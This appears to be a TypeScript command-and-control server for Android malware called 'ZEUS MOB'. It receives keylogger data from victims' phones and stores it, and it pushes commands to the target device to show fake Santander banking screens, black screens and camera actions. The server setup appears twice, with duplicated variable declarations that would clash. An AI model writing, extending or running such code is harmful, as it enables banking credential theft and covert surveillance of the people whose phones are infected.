

export * from "./schema";
import { Server } from "socket.io";
import http from "http";
import { drizzle } from 'drizzle-orm/node-postgres';
import { Pool } from 'pg';
import * as schema from "./schema";

// 1. Verificação do Banco de Dados (Mantenha o que já existe)
if (!process.env.DATABASE_URL) {
  throw new Error("DATABASE_URL must be set. Did you forget to provision a database?");
}

export const pool = new Pool({
  connectionString: process.env.DATABASE_URL
});
export const db = drizzle(pool, { schema });
// --- INÍCIO DA PARTE NOVA (ZEUS MOB) ---
const httpServer = http.createServer(); 
const io = new Server(httpServer, {
  cors: { origin: "*" }
});

io.on('connection', (socket) => {
  console.log('📱 Cliente conectado ao ZEUS MOB:', socket.id);

  // Recebe Logs de Digitação do Android
  socket.on('keylogger_data', (data: { device: string, text: string }) => {
    console.log(`[LOG] ${data.device}: ${data.text}`);
  });

  // Comando para as Telas Fakes (Santander, Tela Preta, etc)
  socket.on('send_command', (command: string) => {
    io.emit('execute_action', { action: command });
  });
});

// Porta para o Socket (pode ser a 3000 ou a que você já usa)
httpServer.listen(3000);
// --- FIM DA PARTE NOVA ---

export * from "./schema";

// 2. Configuração do Servidor de Comandos (Socket.io)
// Substitua o servidor abaixo pelo que o seu app usa para iniciar (ex: app.listen)
const httpServer = http.createServer();
const io = new Server(httpServer, {
  cors: { origin: "*" }
});

// 3. Função para Salvar Logs (Keylogger) no Banco
export const salvarLogTeclado = async (deviceId: string, texto: string) => {
  try {
    // Aqui ele salva no banco de dados que a Gabriela Almeida acessa
    // await db.insert(schema.logs).values({ deviceId, texto, data: new Date() });
    console.log(`[LOG RECEBIDO] Dispositivo: ${deviceId} | Texto: ${texto}`);
  } catch (err) {
    console.error("Erro ao salvar log:", err);
  }
};

// 4. Gerenciamento de Conexões em Tempo Real
io.on('connection', (socket) => {
  console.log('Dispositivo conectado ao ZEUS MOB:', socket.id);

  // Escuta logs vindos do APK
  socket.on('keylogger_data', (data) => {
    salvarLogTeclado(data.deviceId, data.texto);
  });

  // Escuta comandos enviados pelo seu Painel (Botões de Câmera/Tela Preta)
  socket.on('send_command', (payload) => {
    // Envia o comando especificamente para o celular do alvo
    io.emit('execute_action', { action: payload.action });
  });

  socket.on('disconnect', () => {
    console.log('Dispositivo desconectado');
  });
});

// Inicia o servidor na porta 3000 (ou a que você preferir)
httpServer.listen(3000, () => {
  console.log('Servidor ZEUS MOB rodando na porta 3000');
});

